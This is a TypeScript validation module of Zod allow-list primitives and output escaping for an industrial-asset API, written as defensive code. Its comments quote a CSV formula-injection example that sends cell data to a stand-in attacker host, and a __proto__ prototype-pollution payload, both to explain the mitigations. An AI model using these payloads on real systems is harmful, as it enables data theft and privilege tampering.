import { z } from "zod";

/**
 * Constrained input primitives.
 *
 * ── Why these exist ──────────────────────────────────────────────────────────
 *
 * The generated schemas in `@workspace/api-zod` describe the API *shape* — a
 * field is a string, an array, optional. They carry almost no constraints,
 * because the OpenAPI document they are generated from does not declare any: a
 * name is `zod.string()`, which accepts a 40 MB string, a NUL byte, or a line of
 * ANSI escape codes just as readily as "Pump 3".
 *
 * These primitives are the missing half. Every one is an ALLOW-LIST: it states
 * what a value may contain and rejects everything else, rather than trying to
 * enumerate what is dangerous. That distinction matters — a deny-list of "bad
 * characters" is only ever as good as the imagination of whoever wrote it, and
 * it silently fails on the next encoding trick. An allow-list fails closed.
 *
 * The generated schemas are still the source of truth for the contract and are
 * never edited by hand (see CLAUDE.md). These compose ON TOP, in the validation
 * middleware, where the constraint belongs.
 */

// ── Character-level rules ────────────────────────────────────────────────────

/**
 * C0/C1 control characters, excluding tab/newline/carriage-return.
 *
 * These have no legitimate place in a name, an identifier or a description, and
 * they are the mechanism behind several distinct attacks: NUL truncates strings
 * in C-backed libraries, CR/LF forge headers and log lines, and the ANSI escape
 * introducer (0x1B) lets a stored value rewrite an operator's terminal when they
 * `tail` the log — including moving the cursor to hide what it did.
 */
const CONTROL_CHARS = /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x9F]/;

/**
 * Characters that change how text is DISPLAYED without changing what it says:
 * bidirectional overrides and invisible separators.
 *
 * This is the "Trojan Source" class. A value can be made to render in an
 * operator's browser in an order completely different from the bytes stored,
 * which makes a review of what an asset is actually called untrustworthy.
 */
const BIDI_AND_INVISIBLE = /[\u200B-\u200F\u2028-\u202E\u2060-\u2064\u2066-\u206F\uFEFF]/;

/** Reject rather than strip: silently altering what someone typed hides the problem. */
function rejectDangerousChars(value: string, ctx: z.RefinementCtx): void {
  if (CONTROL_CHARS.test(value)) {
    ctx.addIssue({ code: z.ZodIssueCode.custom, message: "must not contain control characters" });
  }
  if (BIDI_AND_INVISIBLE.test(value)) {
    ctx.addIssue({ code: z.ZodIssueCode.custom, message: "must not contain bidirectional or zero-width characters" });
  }
}

/**
 * Free text: anything printable, bounded, no control or display-manipulating
 * characters. Trimmed first, so " " is empty rather than a one-character name.
 *
 * Unicode-normalised to NFC. Without it "café" typed two different ways gives
 * two different byte strings that look identical, which turns a uniqueness check
 * into a coin flip and lets two assets share a visible name.
 */
export function text(max: number, min = 0) {
  return z.string()
    .transform((s) => s.normalize("NFC").trim())
    .superRefine((s, ctx) => {
      if (s.length < min) ctx.addIssue({ code: "too_small", minimum: min, origin: "string", inclusive: true, message: min === 1 ? "must not be empty" : `must be at least ${min} characters` });
      if (s.length > max) ctx.addIssue({ code: "too_big", maximum: max, origin: "string", inclusive: true, message: `must be at most ${max} characters` });
      rejectDangerousChars(s, ctx);
    });
}

/** Required free text. */
export const name = () => text(200, 1);
export const description = () => text(2000);
export const shortText = () => text(200);
export const longText = () => text(10_000);

/**
 * A device/asset identifier. Matched against incoming telemetry `deviceId`
 * exactly and case-sensitively (see routes/ingest.ts), so the character set is
 * kept narrow deliberately: a name that differs only by an invisible character
 * would silently never match, and the symptom would be "telemetry is missing"
 * with nothing to see in the UI.
 */
export const identifier = () =>
  z.string()
    .transform((s) => s.trim())
    .pipe(
      z.string()
        .min(1, "must not be empty")
        .max(128, "must be at most 128 characters")
        .regex(/^[A-Za-z0-9._:/-]+$/, "may contain only letters, digits and . _ : / -"),
    );

/**
 * A UUID, as produced by the database.
 *
 * Any 8-4-4-4-12 hex string, as zod 3's `.uuid()` accepted. zod 4's `z.uuid()`
 * also enforces the RFC 9562 version and variant bits, which would refuse ids the
 * platform already holds (the seed's fixed ids such as
 * 00000011-0000-0000-0000-000000000001); `z.guid()` keeps the old rule.
 */
export const uuid = () => z.guid("must be a valid UUID");

/**
 * A client-minted node id (`vn-<uuid>`) or a UUID.
 *
 * Kept to a strict pattern because these ids are concatenated into URLs and used
 * as object keys; an unconstrained string here is how a key ends up colliding
 * with `__proto__`.
 */
export const nodeId = () =>
  z.string().max(64).regex(/^[A-Za-z0-9_-]+$/, "may contain only letters, digits, hyphen and underscore");

/** Email, bounded to the RFC-practical maximum. */
export const email = () =>
  z.string()
    .transform((s) => s.trim().toLowerCase())
    .pipe(z.string().email("must be a valid email address").max(320));

/** Username: the login handle, deliberately narrow. */
export const username = () =>
  z.string()
    .transform((s) => s.trim())
    .pipe(
      z.string()
        .min(2, "must be at least 2 characters")
        .max(64, "must be at most 64 characters")
        .regex(/^[A-Za-z0-9._-]+$/, "may contain only letters, digits and . _ -"),
    );

/**
 * An http(s) URL that the SERVER may be asked to call.
 *
 * Scheme is an allow-list of exactly two. That is what blocks `javascript:`,
 * `data:`, `file:` (local file read) and `gopher:`/`dict:` (protocol smuggling
 * against internal services). Whether the HOST is acceptable is a separate
 * question answered by lib/outbound-url.ts — this only settles the syntax.
 */
export const httpUrl = () =>
  z.string()
    .max(2048, "must be at most 2048 characters")
    .superRefine((value, ctx) => {
      let parsed: URL;
      try {
        parsed = new URL(value);
      } catch {
        ctx.addIssue({ code: z.ZodIssueCode.custom, message: "must be a valid absolute URL" });
        return;
      }
      if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
        ctx.addIssue({ code: z.ZodIssueCode.custom, message: "must use http:// or https://" });
      }
      if (CONTROL_CHARS.test(value)) {
        ctx.addIssue({ code: z.ZodIssueCode.custom, message: "must not contain control characters" });
      }
    });

/** Bounded integer — the guard against `?limit=99999999` becoming a table scan. */
export const boundedInt = (min: number, max: number, fallback?: number) => {
  const base = z.coerce.number()
    .int("must be a whole number")
    .min(min, `must be at least ${min}`)
    .max(max, `must be at most ${max}`);
  return fallback === undefined ? base : base.default(fallback);
};

/** A finite number. Excludes NaN and ±Infinity, which JSON.parse happily produces via `1e999`. */
export const finiteNumber = (min?: number, max?: number) => {
  let s = z.coerce.number().finite("must be a finite number");
  if (min !== undefined) s = s.min(min, `must be at least ${min}`);
  if (max !== undefined) s = s.max(max, `must be at most ${max}`);
  return s;
};

/** An ISO timestamp, bounded to a sane calendar range. */
export const timestamp = () =>
  z.coerce.date()
    .refine((d) => !Number.isNaN(d.getTime()), "must be a valid date")
    .refine((d) => d.getFullYear() >= 1970 && d.getFullYear() <= 2200, "must be between 1970 and 2200");

/** One of a fixed set — the purest allow-list there is. */
export const oneOf = <T extends readonly [string, ...string[]]>(values: T) => z.enum(values);

/** Bounded array of bounded things. */
export const boundedArray = <T extends z.ZodTypeAny>(item: T, max: number) =>
  z.array(item).max(max, `must contain at most ${max} items`);

type WithoutDefault<T> = T extends z.ZodDefault<infer I> ? I : T extends z.ZodPrefault<infer I> ? I : T;

/**
 * `schema.partial()` for a partial-update body, without the fields' defaults.
 *
 * zod 4 applies a field's `.default()` even when the field is wrapped in
 * `.optional()` (zod 3 did not), so `Create.partial()` would fill every field
 * the client left out with its default, and the update would overwrite stored
 * values the client never mentioned. Each field's default is removed first, so
 * an omitted field stays absent as it did under zod 3.
 */
export function partialUpdate<T extends z.ZodRawShape>(
  schema: z.ZodObject<T>,
): z.ZodObject<{ [K in keyof T]: z.ZodOptional<WithoutDefault<T[K]>> }> {
  const shape: Record<string, z.ZodType> = {};
  for (const [key, field] of Object.entries(schema.shape) as [string, z.ZodType][]) {
    const inner = field instanceof z.ZodDefault || field instanceof z.ZodPrefault ? (field.unwrap() as z.ZodType) : field;
    shape[key] = inner.optional();
  }
  return schema.extend(shape) as never;
}

// ── Structural limits for free-form JSON ─────────────────────────────────────

/**
 * Widget configuration and ingest payloads are legitimately open-ended: we
 * cannot enumerate every key a dashboard widget might carry. Open-ended is not
 * the same as unlimited, though — without a bound, one request can nest an
 * object ten thousand deep and take the process down when something later walks
 * it recursively (JSON.stringify, a deep clone, the Postgres jsonb parser).
 *
 * So the CONTENT stays free-form and the STRUCTURE is bounded.
 */
export interface JsonLimits {
  maxDepth: number;
  maxKeys: number;
  maxStringLength: number;
  maxArrayLength: number;
}

export const DEFAULT_JSON_LIMITS: JsonLimits = {
  maxDepth: 12,
  maxKeys: 2000,
  maxStringLength: 100_000,
  maxArrayLength: 5000,
};

/**
 * Live Twin scenes (POST/PUT /plant-twins): a large plant has far more keys than
 * a dashboard. The global request guard allows the same key count on those two
 * routes, so the per-route limit is the one that applies (audit M-15).
 */
export const PLANT_SCENE_JSON_LIMITS = { maxKeys: 40_000, maxArrayLength: 5000 };

/**
 * Keys that must never appear in an object that will be spread, merged or used
 * to build a database update.
 *
 * `{"__proto__": {"isAdmin": true}}` survives JSON.parse as a real own property,
 * and any subsequent `{...body}` or `Object.assign` can promote it onto the
 * prototype chain — after which every object in the process appears to have that
 * property. Rejecting the key outright is the only reliable answer, because
 * whether a given downstream operation is exploitable is not something a route
 * author should have to reason about.
 */
const FORBIDDEN_KEYS = new Set(["__proto__", "constructor", "prototype"]);

export interface JsonCheckResult {
  ok: boolean;
  error?: string;
  /**
   * "size": too many keys, too long an array or string; a big legitimate
   * document can hit these. "structure": nesting depth, a forbidden key or a
   * non-finite number; nothing produces these by accident.
   */
  kind?: "size" | "structure";
}

/** Walk a parsed JSON value and enforce the structural limits. Iterative, so the checker itself cannot blow the stack. */
export function checkJsonStructure(root: unknown, limits: JsonLimits = DEFAULT_JSON_LIMITS): JsonCheckResult {
  const stack: Array<{ value: unknown; depth: number }> = [{ value: root, depth: 0 }];
  let keyCount = 0;

  while (stack.length > 0) {
    const { value, depth } = stack.pop()!;

    if (depth > limits.maxDepth) {
      return { ok: false, error: `nesting is deeper than ${limits.maxDepth} levels`, kind: "structure" };
    }
    if (typeof value === "string") {
      if (value.length > limits.maxStringLength) {
        return { ok: false, error: `a string value exceeds ${limits.maxStringLength} characters`, kind: "size" };
      }
      continue;
    }
    if (typeof value === "number" && !Number.isFinite(value)) {
      return { ok: false, error: "numeric values must be finite", kind: "structure" };
    }
    if (Array.isArray(value)) {
      if (value.length > limits.maxArrayLength) {
        return { ok: false, error: `an array exceeds ${limits.maxArrayLength} items`, kind: "size" };
      }
      for (const v of value) stack.push({ value: v, depth: depth + 1 });
      continue;
    }
    if (value && typeof value === "object") {
      // Own properties only — `in` would walk the prototype chain and is exactly
      // what a pollution attempt wants us to do.
      for (const key of Object.keys(value)) {
        if (FORBIDDEN_KEYS.has(key)) {
          return { ok: false, error: `the key "${key}" is not allowed`, kind: "structure" };
        }
        if (++keyCount > limits.maxKeys) {
          return { ok: false, error: `the payload has more than ${limits.maxKeys} keys`, kind: "size" };
        }
        stack.push({ value: (value as Record<string, unknown>)[key], depth: depth + 1 });
      }
    }
  }
  return { ok: true };
}

// ── Output-side escaping ─────────────────────────────────────────────────────

/**
 * Escape a value for a CSV cell.
 *
 * The quoting half of this is ordinary RFC 4180. The `'` prefix is not:
 * a cell whose text begins with `=`, `+`, `-`, `@`, tab or CR is interpreted by
 * Excel, LibreOffice and Google Sheets as a FORMULA, not as text. So an asset
 * named
 *
 *     =HYPERLINK("https://attacker.example/?"&A1,"Click")
 *
 * exports cleanly, and then runs in the spreadsheet of whoever opens the export
 * — on their machine, with their network access, outside this application
 * entirely. Prefixing with an apostrophe forces the cell to be read as text; it
 * is the standard mitigation and is stripped by the spreadsheet on display.
 *
 * Applied at RENDER time rather than on storage, because the value is only
 * dangerous in this one format — mangling it in the database would corrupt an
 * asset name that is perfectly legitimate in the UI and the API.
 */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  let s = String(value);

  // Strip control characters that would break the row structure regardless of quoting.
  s = s.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "");

  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;

  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/**
 * Make a string safe to interpolate into a `Content-Disposition` filename.
 *
 * Two separate problems. A quote or CR/LF would terminate the header and let the
 * rest of the value inject headers of its own. Separately, `../` or a leading
 * slash in a suggested filename is a path-traversal attempt aimed at whatever
 * downloads it — some clients and unzip-style tools will honour it and write
 * outside the download directory.
 *
 * Reduced to a conservative allow-list rather than escaped, because there is no
 * legitimate export filename that needs anything else.
 */
export function safeFilename(value: string, fallback = "export"): string {
  const cleaned = value
    .normalize("NFC")
    .replace(/[^A-Za-z0-9._-]/g, "_")
    .replace(/^\.+/, "")          // no leading dots: hidden files, and ".." itself
    .slice(0, 100);
  return cleaned.length > 0 ? cleaned : fallback;
}
